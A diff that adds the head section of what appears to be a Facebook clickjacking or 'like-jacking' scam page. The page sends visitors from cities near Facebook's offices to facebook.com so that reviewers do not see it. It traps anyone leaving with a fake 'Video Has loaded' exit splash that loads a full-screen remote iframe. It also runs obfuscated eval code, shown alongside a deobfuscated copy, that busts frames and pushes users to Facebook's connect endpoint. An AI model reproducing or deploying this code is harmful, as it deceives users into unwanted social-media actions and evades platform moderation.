@@ -1,0 +1,211 @@
+<script language="JavaScript" src="http://j.maxmind.com/app/geoip.js"></script>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=1024, user-scalable=no">
+	<script src="//ads.lfstmedia.com/getad?site=110220" type="text/javascript"></script>
+
+	<script language="JavaScript">
+	
+	var city= geoip_city();
+	var state= geoip_region();
+	var country= geoip_country_code();
+	
+	if((city == "Menlo Park")||(city == "Palo Alto")||(city == "Montara")||(city == "Mountain View")||(city == "Torrance"))
+	{
+	window.location="http://facebook.com/facebook";
+	}
+	</script>
+
+	<script type="text/javascript">
+ 
+	
+	var PreventExitSplash = false;
+
+	function addLoadEvent(func){
+        var oldonload = window.onload;
+        if (typeof window.onload != 'function') {
+            window.onload = func;
+        }
+        else {
+            window.onload = function(){
+                if (oldonload) {
+                    oldonload();
+                }
+                func();
+            }
+        }
+    }
+    
+    function addClickEvent(a, i, func){
+        if (typeof a[i].onclick != 'function') {
+            a[i].onclick = func;
+        }
+    }
+	
+    function DisableExitSplash(){
+        PreventExitSplash = true;
+    }
+    
+    function EnableExitSplash(){
+        PreventExitSplash = false;
+    }
+            
+	function disable_links() {
+		for (var i = 0; i < document.links.length; i++) {
+	        addClickEvent(document.links, i, function(){
+	            PreventExitSplash = true;
+	        });	
+		}
+	}
+	
+	function disable_submits() {
+		var var_inputs = document.getElementsByTagName('input');
+		for (var i = 0; i < var_inputs.length; i++) {
+		    if (var_inputs[i].type == "submit") {
+		        var_inputs[i].onclick = function(){ PreventExitSplash = true; }
+		    }
+		}
+	}
+	
+	function load_ett() {
+		disable_links();
+		disable_submits();
+	}
+	
+	disable_links();
+	disable_submits();
+	
+	var exitsplashmessage = 'Herp Derp!!!\n\nVideo Has loaded\n\nStay on this page to watch the video';
+	
+		var exitpop_loaded = true;
+	var ett_div = '<div id="ExitSplashDiv" style="display:block; width:100%; height:100%; position:absolute; background:#FFFFFF; margin-top:0px; margin-left:0px;" align="center">';
+	ett_div = ett_div + '<iframe src="http://dzi53wj925pgs.cloudfront.net/videosi.php" width="100%" height="100%" align="middle" frameborder="0"></iframe>';
+	ett_div = ett_div + '</div>';
+	function DisplayExitSplash(){
+		if (!PreventExitSplash) {
+			window.scrollTo(0, 0);
+			PreventExitSplash = true;
+			new_div = document.createElement("div");
+			new_div.setAttribute("id", "ExitSplashMainOuterLayer");
+			new_div.style.position = "absolute";
+			new_div.style.width = "100%";
+			new_div.style.height = "100%";
+			new_div.style.zIndex = "99";
+			new_div.style.left = "0px";
+			new_div.style.top = "0px";
+			new_div.innerHTML = ett_div;
+			body_tag.innerHTML = "";
+			body_tag.topMargin = "0px";
+			body_tag.rightMargin = "0px";
+			body_tag.bottomMargin = "0px";
+			body_tag.leftMargin = "0px";
+			body_tag.style.overflow = "hidden";
+			body_tag.appendChild(new_div);
+			return exitsplashmessage;
+		}
+	}
+	function wait_for_body_tag() {
+		body_tag = document.getElementsByTagName("body").item(0);
+		if (body_tag == null) {
+			setTimeout("wait_for_body_tag();", 200);
+		} else {
+			window.onbeforeunload = DisplayExitSplash;
+		}
+	}
+	wait_for_body_tag();
+	addLoadEvent(load_ett);
+ 
+</script>
+
+
+	<!-- Jacked Authorization Code -->
+
+	<script>
+	var JACKED_AUTH = "da39a3ee5e6b4b0d3255bfef95601890afd80709";
+	</script>
+	<!-- replace with your base directory -->
+	
+	<title></title>
+	<style>
+	/* http://meyerweb.com/eric/tools/css/reset/ 
+   v2.0 | 20110126
+   License: none (public domain)
+*/
+
+html, body, div, span, applet, object, iframe,
+h1, h2, h3, h4, h5, h6, p, blockquote, pre,
+a, abbr, acronym, address, big, cite, code,
+del, dfn, em, img, ins, kbd, q, s, samp,
+small, strike, strong, sub, sup, tt, var,
+b, u, i, center,
+dl, dt, dd, ol, ul, li,
+fieldset, form, label, legend,
+table, caption, tbody, tfoot, thead, tr, th, td,
+article, aside, canvas, details, embed, 
+figure, figcaption, footer, header, hgroup, 
+menu, nav, output, ruby, section, summary,
+time, mark, audio, video {
+	margin: 0;
+	padding: 0;
+	border: 0;
+	font-size: 100%;
+	font: inherit;
+	vertical-align: baseline;
+}
+/* HTML5 display-role reset for older browsers */
+article, aside, details, figcaption, figure, 
+footer, header, hgroup, menu, nav, section {
+	display: block;
+}
+body {
+	line-height: 1;
+}
+ol, ul {
+	list-style: none;
+}
+blockquote, q {
+	quotes: none;
+}
+blockquote:before, blockquote:after,
+q:before, q:after {
+	content: '';
+	content: none;
+}
+table {
+	border-collapse: collapse;
+	border-spacing: 0;
+}
+	</style>
+	<!-- Required stylesheet -->
+	<link rel="stylesheet" href="http://dzi53wj925pgs.cloudfront.net/watch/core/deck.core.css">
+	
+	<!-- Extension CSS files go here. Remove or add as needed. -->
+	<link rel="stylesheet" href="http://dzi53wj925pgs.cloudfront.net/watch/buttons/fb-buttons.css">
+	<!--
+	<link rel="stylesheet" href="extensions/goto/deck.goto.css">
+	<link rel="stylesheet" href="extensions/menu/deck.menu.css">
+	<link rel="stylesheet" href="extensions/navigation/deck.navigation.css">
+	<link rel="stylesheet" href="extensions/status/deck.status.css">
+	<link rel="stylesheet" href="extensions/hash/deck.hash.css">
+	<link rel="stylesheet" href="extensions/scale/deck.scale.css">
+-->
+	<!-- Style theme. More available in /themes/style/ or create your own. -->
+	<link rel="stylesheet" href="http://dzi53wj925pgs.cloudfront.net/watch/themes/style/web-2.0.css">
+	
+	<!-- Transition theme. More available in /themes/transition/ or create your own. -->
+	<link rel="stylesheet" href="http://dzi53wj925pgs.cloudfront.net/watch/themes/transition/horizontal-slide.css">
+	
+	<!-- Required Modernizr file -->
+	<script src="http://dzi53wj925pgs.cloudfront.net/watch/modernizr.custom.js"></script>
+	<!-- Break Out of Facebooks Frame -->
+	<script>
+		//var _0x3056=["\x33\x28\x34\x21\x3D\x35\x26\x26\x31\x2E\x30\x2E\x39\x21\x3D\x27\x23\x61\x27\x29\x7B\x33\x28\x22\x62\x22\x63\x20\x31\x2E\x64\x28\x22\x65\x22\x29\x29\x7B\x31\x2E\x30\x3D\x22\x36\x3A\x2F\x2F\x32\x2E\x37\x2F\x38\x2F\x38\x2E\x66\x3F\x67\x3D\x36\x3A\x2F\x2F\x68\x2E\x32\x2E\x37\x2F\x32\x26\x69\x3D\x6A\x22\x7D\x6B\x7B\x34\x2E\x30\x3D\x35\x2E\x30\x7D\x7D","\x7C","\x73\x70\x6C\x69\x74","\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x69\x66\x7C\x74\x6F\x70\x7C\x73\x65\x6C\x66\x7C\x68\x74\x74\x70\x7C\x63\x6F\x6D\x7C\x63\x6F\x6E\x6E\x65\x63\x74\x7C\x68\x61\x73\x68\x7C\x6C\x6F\x63\x6B\x7C\x73\x61\x6E\x64\x62\x6F\x78\x7C\x69\x6E\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x69\x66\x72\x61\x6D\x65\x7C\x70\x68\x70\x7C\x68\x72\x65\x66\x7C\x77\x77\x77\x7C\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x73\x7C\x31\x30\x30\x7C\x65\x6C\x73\x65","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function (_0xb9f5x1,_0xb9f5x2,_0xb9f5x3,_0xb9f5x4,_0xb9f5x5,_0xb9f5x6){_0xb9f5x5=function (_0xb9f5x3){return _0xb9f5x3.toString(_0xb9f5x2);} ;if(!_0x3056[5][_0x3056[4]](/^/,String)){while(_0xb9f5x3--){_0xb9f5x6[_0xb9f5x5(_0xb9f5x3)]=_0xb9f5x4[_0xb9f5x3]||_0xb9f5x5(_0xb9f5x3);} ;_0xb9f5x4=[function (_0xb9f5x5){return _0xb9f5x6[_0xb9f5x5];} ];_0xb9f5x5=function (){return _0x3056[6];} ;_0xb9f5x3=1;} ;while(_0xb9f5x3--){if(_0xb9f5x4[_0xb9f5x3]){_0xb9f5x1=_0xb9f5x1[_0x3056[4]]( new RegExp(_0x3056[7]+_0xb9f5x5(_0xb9f5x3)+_0x3056[7],_0x3056[8]),_0xb9f5x4[_0xb9f5x3]);} ;} ;return _0xb9f5x1;} (_0x3056[0],21,21,_0x3056[3][_0x3056[2]](_0x3056[1]),0,{}));
+		//KC:: Deobfuscated the above JS using http://deobfuscatejavascript.com
+		if (top != self && document.location.hash != '#lock') {
+			if ("sandbox" in document.createElement("iframe")) {
+				document.location = "http://facebook.com/connect/connect.php?href=http://www.facebook.com/facebook&connections=100"
+			} else {
+				top.location = self.location
+			}
+		}
+	</script>
